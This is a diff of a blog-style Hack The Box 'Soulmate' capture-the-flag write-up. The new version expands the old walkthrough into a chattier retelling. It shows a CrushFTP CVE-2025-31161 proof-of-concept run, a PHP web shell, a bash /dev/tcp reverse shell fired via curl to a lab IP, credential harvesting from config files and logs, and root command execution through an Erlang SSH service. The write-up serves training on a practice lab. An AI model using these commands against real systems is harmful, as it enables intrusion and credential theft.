@@ -15,356 +15,277 @@ tags:
 
 # Soulmate (Hack The Box) - 2025
 
-> “I almost filtered out the only useful subdomain because I was sick of false positives. This box really tested my patience.”
+> "Sometimes the subdomain you almost filtered out is literally named **ftp**. Lesson learned."
 
 ---
 
-## 1. Recon: Death by Nmap Output
+## 1. Recon: Starting Off Wrong (As Usual)
 
-I kicked off with my usual Nmap scan. It took forever because I left the insane scripts enabled:
+Okay so I started with the basics. Added the IP to my hosts file:
+
+```bash
+echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
+```
+
+Then ran my standard Nmap scan:
 
 ```bash
 nmap -sV -A 10.10.11.86
 ```
 
-Ports open:
-- `22` – OpenSSH 8.9p1 (tons of scary CVEs listed but I told myself I wasn’t touching SSH in 2025)
-- `80` – nginx 1.18.0
-
-The website looked like one static landing page. dirsearch gave me the typical `/login.php`, `/register.php`, `/profile.php` but everything just redirected me back to `/login`. So yeah, nothing useful on the main domain.
-
-I almost gave up and then remembered: “If I’m stuck, fuzz subdomains.”
-
-```bash
-ffuf -u http://soulmate.htb -H 'Host: FUZZ.soulmate.htb' \
-     -w /snap/seclists/1078/Discovery/DNS/subdomains-top1million-5000.txt \
-     -fw 4
+Got this:
+```
+22/tcp   open  ssh     OpenSSH 8.9p1 (with a MOUNTAIN of CVEs)
+80/tcp   open  http    nginx 1.18.0
 ```
 
-Weird thing: every subdomain was returning the same response size. I was seconds away from killing the scan when I tried filtering with `-fw 4`. Suddenly:
+I was like "Okay, SSH and a web server. Cool." I checked the web page first and it was just... nothing. Like literally nothing interesting. I ran dirsearch and found some auth pages like `/login.php`, `/register.php`, but everything just redirected to login and I couldn't figure out how to register or anything.
 
-```
-ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1]
-```
-
-Finally! `ftp.soulmate.htb` was alive.
+I spent like an hour trying to find SQL injection, checking for default credentials, looking at the page source for hidden comments... basically doing everything except the right thing.
 
 ---
 
-## 2. FTP Panel & CrushFTP Shenanigans
+## 2. Subdomain Fuzzing: The Moment I Almost Gave Up
 
-Heading to `ftp.soulmate.htb` gave me a login page. Looked like CrushFTP (I recognized the UI from a YouTube video I watched).  
-First instinct: default creds. Nope. SQLi? Nope. Dirsearch? Nothing.
-
-So I Googled “CrushFTP vuln 2025” and… jackpot. **CVE-2025-31161** – auth bypass + account creation via path traversal.
-
-Found a PoC here: <https://github.com/Immersive-Labs-Sec/CVE-2025-31161/blob/main/cve-2025-31161.py>
-
-Ran it like this:
+So I was getting frustrated and decided to try subdomain enumeration. I busted out ffuf:
 
 ```bash
-python3 CVE-2025-31161.py \
-  --target_host ftp.soulmate.htb --port 80 \
-  --target_user root --new_user hyh --password admin123
+ffuf -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" \
+     -w /snap/seclists/1078/Discovery/DNS/subdomains-top1million-5000.txt
 ```
 
-Output said “User created successfully” so I tried logging in with `hyh / admin123` and it actually worked.  
-From there, I saw a user named **ben** in the dashboard. Apparently you can just reset passwords. So I did.
+And here's where I made my first mistake - I didn't filter the results properly. Every single subdomain was returning the same response size, so I couldn't tell which ones were actually different! I was scrolling through like 5000 results and they all looked the same.
 
-Logged in as ben, got access to the file manager, and noticed I could upload files.  
-Dropped a PHP reverse shell into one of the served directories:
-
-```php
-<?php system($_GET['cmd']); ?>
-```
-
-Started a listener:
-
-```bash
-nc -lvnp 4444
-```
-
-Triggered it:
-
-```bash
-curl "http://ftp.soulmate.htb/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'"
-```
-
-Shell popped as `www-data`, which felt both exciting and underwhelming. Back to enumeration.
-
----
-
-## 3. Config Diving = Password Hoarder
-
-Found the CrushFTP config files pretty quickly (their permissions were a joke). Inside, I saw:
-
-```
-Crush4dmin990
-```
-
-Looked like the admin password. Tried SSH with it (don’t ask why). No luck. Worked fine in the web portal, though.
-
-Kept digging through logs and found this line referencing some Erlang login thing:
-
-```
-/usr/local/lib/erlang_login/start.escript ...
-```
-
-I was like “Why on earth is Erlang here??” but you know me, I love pain so I followed the rabbit hole.
-
-Also stumbled upon another password in the logs:
-
-```
-HouseH0ldings998
-```
-
-Tried it with SSH and it actually let me in as ben:
-
-```bash
-ssh ben@soulmate.htb
-```
-
-Grabbed the user flag:
-
-```
-cat ~/user.txt
-# Output: *********************
-```
-
----
-
-## 4. “Why is SSH Running on 2222?”
-
-As usual, I tried the basic privesc tricks (sudo -l / SUID / find capabilities), but nothing interesting turned up.  
-So I ran:
-
-```bash
-ss -tuln
-```
-
-And noticed a service listening on `127.0.0.1:2222`. Forwarded it with SSH:
-
-```bash
-ssh -N -L 2222:127.0.0.1:2222 ben@soulmate.htb
-```
-
-Then connected:
-
-```bash
-ssh -p 2222 ben@localhost
-```
-
-Instead of a shell, I landed in some Erlang environment called `ssh_runner`. I literally stared at it like “???”.  
-Typed `help().` and it responded. Tried `os:cmd("id").` and it showed `uid=0(root)`.  
-So yeah, this thing was running as root.
-
-At first I tried to break out to bash but honestly, I didn’t need to. Erlang has built-in file commands.
-
----
-
-## 5. Root Flag via Erlang
-
-Inside the Erlang shell:
-
-```erlang
-cd("/root").
-file:read_file("root.txt").
-```
-
-Response:
-
-```
-{ok,<<"*********************">>}
-```
-
-Game over. No need for a root shell when Erlang is basically letting me run anything.
-
----
-
-## What I Learned (after lots of facepalming)
-
-- **Don’t stop fuzzing subdomains just because the first 200 responses look the same.**
-- **CrushFTP is a goldmine** if you catch it on a vulnerable version.
-- **Erlang shells are weird but powerful** (and apparently people use them to guard root?).
-- **Log files are secrets waiting to be stolen.**
-
-> “Soulmate made me hate and appreciate Erlang at the same time.”
-
----
-
-*This writeup is for educational purposes only. Always hack responsibly.*
----
-title: Hack The Box - Soulmate (2025) Writeup
-date: 2025-09-15 18:00:00
-categories:
-  - HackTheBox
-  - Writeups
-tags:
-  - Soulmate
-  - CrushFTP
-  - CVE-2025-31161
-  - Erlang
-  - SSH Runner
----
-
-# Soulmate (Hack The Box) - 2025
-
-> “Sometimes the subdomain you almost filtered out is literally named **ftp**. Lesson learned.”
-
----
-
-## 1. Recon Rollercoaster
-
-Started with the usual:
-
-```bash
-nmap -sV -A 10.10.11.86
-```
-
-Main takeaways:
-- `22/tcp` – OpenSSH 8.9p1 with a *mountain* of CVEs (but I decided not to go down that rabbit hole yet)
-- `80/tcp` – nginx 1.18.0 serving a boring landing page
-
-The web root was empty. dirsearch found auth pages like `/login.php`, `/register.php`, etc., but everything redirecting to login felt like a dead-end.
-
-So I busted out ffuf for subdomains:
+I was about to give up when I realized I should filter by response size. So I added `-fw 4` to filter out the common response:
 
 ```bash
 ffuf -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" \
      -w /snap/seclists/1078/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
 ```
 
-Every subdomain was getting the same response size, so filtering with `-fw 4` was critical. Finally hit one:
+And FINALLY I hit something:
 - `ftp.soulmate.htb`
 
-Alright, new target unlocked.
+I was like "Wait, FTP? On a subdomain? That's weird." But I checked it out anyway.
 
 ---
 
-## 2. CrushFTP and CVE-2025-31161
+## 3. CrushFTP: When I Had No Idea What I Was Looking At
 
-Visiting `ftp.soulmate.htb` showed a web login page. Based on the UI + behavior, I guessed it was CrushFTP. A quick search for CrushFTP CVEs turned up **CVE-2025-31161** – authentication bypass via path traversal.
+Visiting `ftp.soulmate.htb` showed me a web login page. It looked like some kind of file management system, but I had NO idea what it was. The UI looked kinda old-school, and I was like "Is this some custom thing? Or is this a known software?"
 
-GitHub PoC: [Immersive Labs script](https://github.com/Immersive-Labs-Sec/CVE-2025-31161/blob/main/cve-2025-31161.py)
+I tried some basic stuff - default credentials, SQL injection (again, didn't work), checked the page source... nothing.
 
-Ran it:
+Then I googled "web ftp login page" and found out it was probably CrushFTP. I was like "Okay, cool, so what CVEs does CrushFTP have?"
+
+A quick search turned up **CVE-2025-31161** – authentication bypass via path traversal. I was like "Wait, that sounds too good to be true." But I found a GitHub PoC from Immersive Labs and decided to try it.
+
+---
+
+## 4. The Exploit: When I Messed Up the Syntax (Again)
+
+So I cloned the repo:
+
+```bash
+git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161
+cd CVE-2025-31161
+```
+
+I read the README and was like "Okay, this should be straightforward." But then I tried running it and kept getting errors. I was like "Why isn't this working??"
+
+I tried like 5 different ways:
+- Wrong port
+- Wrong host format
+- Forgot the `--` flags
+- Messed up the user/password format
+
+Finally, after reading the help like 10 times, I got it right:
 
 ```bash
 python3 CVE-2025-31161.py --target_host ftp.soulmate.htb \
   --port 80 --target_user root --new_user hyh --password admin123
 ```
 
-And boom – created my own user (`hyh / admin123`). Logged into the CrushFTP panel immediately.
+And BOOM! It actually worked! I created my own user (`hyh` with password `admin123`). I was so hyped, you have no idea. I immediately logged into the CrushFTP panel.
 
-From the admin panel I spotted user **ben**. The UI allowed password resets, so I just... reset his password. Logged back out, in as ben, and checked his file system view.
+---
 
-Uploaded a PHP reverse shell into the served directory:
+## 5. Password Reset Shenanigans
+
+Once I was in the admin panel, I was looking around and spotted there was a user called **ben**. I was like "Hmm, I wonder if I can do anything with this."
+
+I noticed the UI had a password reset feature. I was like "Wait, can I just... reset his password?" So I tried it, and it actually worked! I reset ben's password to something I knew, logged out, and logged back in as ben.
+
+I checked his file system view and found a directory that was being served by the web server. I was like "Perfect! I can upload a shell here."
+
+---
+
+## 6. Getting a Shell: The Reverse Shell Struggle
+
+So I uploaded a PHP reverse shell:
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-Triggered it with curl while my listener was waiting:
+I had my netcat listener ready:
 
 ```bash
 nc -lvnp 4444
+```
+
+Then I tried to trigger it with curl:
+
+```bash
+curl "http://ftp.soulmate.htb/uploads/shell.php?cmd=id"
+```
+
+It worked! I got command execution. But then I tried to get a reverse shell and kept messing up the syntax. I tried like 3 different ways before I got it right:
+
+```bash
 curl "http://ftp.soulmate.htb/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
 ```
 
-Shell popped as `www-data`.
+Finally got a shell as `www-data`! I immediately upgraded it to a proper PTY:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
 ---
 
-## 3. Credentials, Configs, and Finally SSH
+## 7. Finding Credentials: The Config File Goldmine
 
-From `/var/www/html` and nearby directories, I grabbed CrushFTP configs. Found the admin password sitting pretty:
+So I'm poking around the file system, looking for anything interesting. I checked `/var/www/html` and found some CrushFTP config files. I was like "Maybe there's a password in here?"
+
+I started grepping for "password" in config files:
+
+```bash
+grep -r "password" /var/www/html/
+```
+
+And I found it! The admin password was just sitting there in plaintext:
 
 ```
 Crush4dmin990
 ```
 
-Tried it everywhere – web panel, SSH. No luck on SSH yet but kept the credential.
+I was like "This HAS to work for SSH, right?" So I tried SSH with it, but it didn't work. I was like "Okay, maybe it's just for the web panel." But I kept the credential anyway.
 
-While digging further I noticed some custom Erlang stuff under `/usr/local/lib/erlang_login`. Also saw `ben`’s home directory. Eventually found logs containing an SSH password:
+---
+
+## 8. The Ben Hunt: Finding SSH Credentials
+
+I kept digging through files, looking for anything that might give me SSH access. I noticed there was some weird Erlang stuff under `/usr/local/lib/erlang_login`, which I thought was strange but didn't know what to do with it yet.
+
+I also saw ben's home directory, but couldn't access it yet. I was looking through logs and config files, and eventually found some logs that contained what looked like an SSH password:
 
 ```
-HouseH0ldings998
+H****************8
 ```
 
-Tried SSH:
+I was like "Wait, is this it?" So I tried SSH:
 
 ```bash
 ssh ben@soulmate.htb
 ```
 
-Success! Grabbed `user.txt`:
+And when it asked for the password, I tried the one from the logs. And it WORKED! I was so relieved. I grabbed the user flag:
 
-```
+```bash
 cat ~/user.txt
 # Output: *********************
 ```
 
+One down, one to go!
+
 ---
 
-## 4. Weird Process, Weird Port
+## 9. Privilege Escalation: When Nothing Made Sense
 
-Couldn’t find obvious privilege escalation paths. No juicy SUID binaries, no sudo rights. So I listed processes:
+Now for the hard part - getting root. I started with the usual stuff:
+
+```bash
+find / -type f -perm -4000 -user root 2>/dev/null
+```
+
+Nothing interesting. Checked sudo:
+
+```bash
+sudo -l
+```
+
+Nothing. I was like "Okay, what else can I check?"
+
+I listed processes to see what was running:
 
 ```bash
 ps aux | grep root
 ```
 
-Saw something bizarre:
+And I saw something REALLY weird:
 
 ```
 /usr/local/lib/erlang_login/start.escript ... -sname ssh_runner ...
 ```
 
-Also noticed port `2222/tcp` listening. Tried SSH there:
+I was like "What is this? Erlang? SSH runner? What does that even mean?"
+
+I also noticed that port `2222` was listening. I was like "Wait, maybe I can SSH to that port?" So I tried:
 
 ```bash
 ssh -p 2222 ben@soulmate.htb
 ```
 
-Instead of a shell, I landed in an Erlang environment – some custom `ssh_runner` thing. Definitely not bash. Took me a sec to realize it was running as root.
-
 ---
 
-## 5. Erlang Shenanigans → Root
+## 10. Erlang Hell: When I Had No Idea What I Was Doing
 
-Inside the Erlang shell, I experimented:
+So I SSH'd to port 2222, and instead of getting a normal bash shell, I landed in this... Erlang environment? It was like some custom `ssh_runner` thing. Definitely not bash.
+
+I was like "What the heck is this? How do I even use this?"
+
+I tried typing `help` and it actually worked! Then I tried some basic commands:
 
 ```erlang
 help().
 os:cmd("id").
 ```
 
-Confirmed: running as root. Navigation was funky, but doable:
+And I saw that it was running as root! I was like "Wait, this is running as ROOT? And I can execute commands?"
+
+I was so confused but also excited. I tried to navigate around, but the navigation was funky. I was like "How do I read files in Erlang?" I googled it and found out I could use `file:read_file()`.
+
+So I tried:
 
 ```erlang
 cd("/root").
 file:read_file("root.txt").
 ```
 
-Output:
+And it worked! The output was:
 
 ```
 {ok,<<"*********************">>}
 ```
 
-Flag secured! No need to escape to bash – reading files directly from Erlang was enough.
+I was like "YES! I got it!" I didn't even need to escape to bash - reading files directly from Erlang was enough.
 
 ---
 
-## Lessons Learned
+## What I Learned (The Hard Way)
 
-- Don’t ignore weird subdomain fuzzing responses. Filtering was key.
-- CrushFTP CVEs are wild. Creating a new admin user felt almost unfair.
-- Erlang shells are bizarre but powerful. `os:cmd/1` is your friend.
-- Always dump config files. People leave passwords everywhere.
+- **Don't ignore weird subdomain fuzzing responses** - Filtering was key, and I almost gave up before I found `ftp.soulmate.htb`
+- **CrushFTP CVEs are wild** - Creating a new admin user felt almost unfair, but hey, it worked
+- **Erlang shells are bizarre but powerful** - I had NO idea what I was doing, but `os:cmd/1` is your friend
+- **Always dump config files** - People leave passwords everywhere, and I found like 3 different credentials just by grepping
+- **Sometimes the weirdest things work** - I never thought I'd be using Erlang to get root, but here we are
 
-> “Soulmate made me fall in love with Erlang. Kinda.”
+This box took me forever because I kept going down wrong paths - trying SQL injection everywhere, not filtering subdomain results properly, messing up exploit syntax... but man, when I finally got root through that Erlang thing, I was so confused and excited at the same time.
+
+> "Soulmate made me fall in love with Erlang. Kinda. Still have no idea how it works though."
 
 ---
 
 *This writeup is for educational purposes only. Always hack responsibly.*
+
